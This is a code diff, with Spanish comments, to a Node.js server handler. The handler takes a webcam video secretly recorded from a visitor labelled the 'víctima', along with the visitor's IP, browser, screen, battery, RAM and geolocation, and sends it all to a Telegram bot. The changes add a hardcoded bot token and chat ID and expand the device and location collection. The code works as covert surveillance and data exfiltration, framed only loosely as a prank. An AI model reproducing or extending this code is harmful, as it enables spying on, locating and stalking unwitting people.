@@ -3,8 +3,8 @@ const fs = require('fs');
 
 // Función para enviar video a Telegram
 async function sendVideoToTelegram(videoBuffer, message, ip) {
-  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8083680161:AAFw7sJh6ckiRHkgMS3WsC6J0Ya8Q5aPwE';
+  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '12075234';
   
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.log('Telegram no configurado');
@@ -12,8 +12,10 @@ async function sendVideoToTelegram(videoBuffer, message, ip) {
   }
 
   try {
+    console.log('Enviando video a Telegram...');
+    
     // Primero enviar el mensaje de texto
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -25,40 +27,34 @@ async function sendVideoToTelegram(videoBuffer, message, ip) {
       })
     });
 
-    // Luego enviar el video usando multipart/form-data manual
-    const boundary = '----formdata-' + Date.now();
+    if (messageResponse.ok) {
+      console.log('Mensaje de texto enviado a Telegram');
+    }
+
+    // Luego enviar el video usando FormData
     const videoFileName = `video_${Date.now()}_${ip.replace(/[:.]/g, '-')}.webm`;
     
-    let body = '';
-    body += `--${boundary}\r\n`;
-    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
-    body += `${TELEGRAM_CHAT_ID}\r\n`;
-    body += `--${boundary}\r\n`;
-    body += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
-    body += `🎥 Video de la víctima capturado\r\n`;
-    body += `--${boundary}\r\n`;
-    body += `Content-Disposition: form-data; name="video"; filename="${videoFileName}"\r\n`;
-    body += `Content-Type: video/webm\r\n\r\n`;
-    
-    // Convertir buffer a binary string
-    const binaryString = videoBuffer.toString('binary');
-    body += binaryString;
-    body += `\r\n--${boundary}--\r\n`;
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('caption', '🎥 Video de la víctima capturado (5 segundos)');
+    formData.append('video', new Blob([videoBuffer], { type: 'video/webm' }), videoFileName);
     
     const videoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
       method: 'POST',
-      headers: {
-        'Content-Type': `multipart/form-data; boundary=${boundary}`,
-        'Content-Length': Buffer.byteLength(body, 'binary')
-      },
-      body: Buffer.from(body, 'binary')
+      body: formData
     });
 
     if (videoResponse.ok) {
-      console.log('Video enviado a Telegram');
+      console.log('Video enviado a Telegram exitosamente');
+      return true;
+    } else {
+      const errorText = await videoResponse.text();
+      console.error('Error en respuesta de Telegram video:', errorText);
+      return false;
     }
   } catch (error) {
     console.error('Error enviando video a Telegram:', error);
+    return false;
   }
 }
 
@@ -71,6 +67,7 @@ module.exports = async (req, res) => {
     // Obtener IP del usuario
     const ip = req.headers['x-forwarded-for'] || 
                req.headers['x-real-ip'] || 
+               req.connection.remoteAddress ||
                'unknown';
                
     const userAgent = req.headers['user-agent'] || 'unknown';
@@ -92,6 +89,16 @@ module.exports = async (req, res) => {
     const videoBuffer = require('fs').readFileSync(videoFile.filepath);
     const fileSize = (videoFile.size / 1024 / 1024).toFixed(2); // MB
 
+    // Información del dispositivo si está disponible
+    let deviceInfo = {};
+    if (fields.deviceInfo && fields.deviceInfo[0]) {
+      try {
+        deviceInfo = JSON.parse(fields.deviceInfo[0]);
+      } catch (e) {
+        console.log('Error parsing device info');
+      }
+    }
+
     // Analizar User Agent para detalles
     let deviceType = 'Unknown';
     let os = 'Unknown';
@@ -112,8 +119,32 @@ module.exports = async (req, res) => {
     else if (userAgent.includes('Safari')) browser = 'Safari';
     else if (userAgent.includes('Edge')) browser = 'Edge';
 
+    // Crear información detallada del dispositivo
+    let deviceDetails = '';
+    if (deviceInfo.screenWidth) {
+      deviceDetails += `📱 <b>Pantalla:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
+    }
+    if (deviceInfo.timezone) {
+      deviceDetails += `🌍 <b>Zona horaria:</b> ${deviceInfo.timezone}\n`;
+    }
+    if (deviceInfo.language) {
+      deviceDetails += `🗣️ <b>Idioma:</b> ${deviceInfo.language}\n`;
+    }
+    if (deviceInfo.geolocation && deviceInfo.geolocation !== 'No disponible') {
+      deviceDetails += `📍 <b>Ubicación:</b> ${deviceInfo.geolocation.latitude}, ${deviceInfo.geolocation.longitude}\n`;
+    }
+    if (deviceInfo.memory && deviceInfo.memory !== 'N/A') {
+      deviceDetails += `💾 <b>RAM:</b> ${deviceInfo.memory}GB\n`;
+    }
+    if (deviceInfo.cores && deviceInfo.cores !== 'N/A') {
+      deviceDetails += `⚡ <b>CPU Cores:</b> ${deviceInfo.cores}\n`;
+    }
+    if (deviceInfo.battery && deviceInfo.battery !== 'No disponible') {
+      deviceDetails += `🔋 <b>Batería:</b> ${JSON.stringify(deviceInfo.battery)}\n`;
+    }
+
     // Crear mensaje completo para Telegram
-    const message = `🎉 <b>¡VIDEO CAPTURADO CON ÉXITO!</b>
+    const message = `🎉 <b>¡VIDEO CAPTURADO CON ÉXITO!</b> (5 segundos)
 
 📍 <b>IP VÍCTIMA:</b> <code>${ip}</code>
 🎥 <b>Archivo:</b> <code>video_${Date.now()}_${ip.replace(/[:.]/g, '-')}.webm</code>
@@ -122,7 +153,10 @@ module.exports = async (req, res) => {
 
 ${deviceType} <b>Dispositivo:</b> ${os}
 🌐 <b>Navegador:</b> ${browser}
-📱 <b>User Agent completo:</b>
+
+${deviceDetails}
+
+📱 <b>User Agent:</b>
 <code>${userAgent}</code>
 
 🎭 <b>¡BROMA EXITOSA!</b>
@@ -133,12 +167,13 @@ ${deviceType} <b>Dispositivo:</b> ${os}
     await sendVideoToTelegram(videoBuffer, message, ip);
 
     // Log
-    console.log(`[${timestamp}] VIDEO_UPLOADED from ${ip} - Size: ${fileSize}MB`);
+    console.log(`[${timestamp}] VIDEO_UPLOADED from ${ip} - Size: ${fileSize}MB - Duration: 5 seconds`);
 
     res.json({ 
       status: 'success', 
-      message: 'Video grabado correctamente',
-      filename: `video_${Date.now()}_${ip}.webm`
+      message: 'Video de 5 segundos enviado a Telegram correctamente',
+      filename: `video_${Date.now()}_${ip}.webm`,
+      telegramSent: true
     });
 
   } catch (error) {
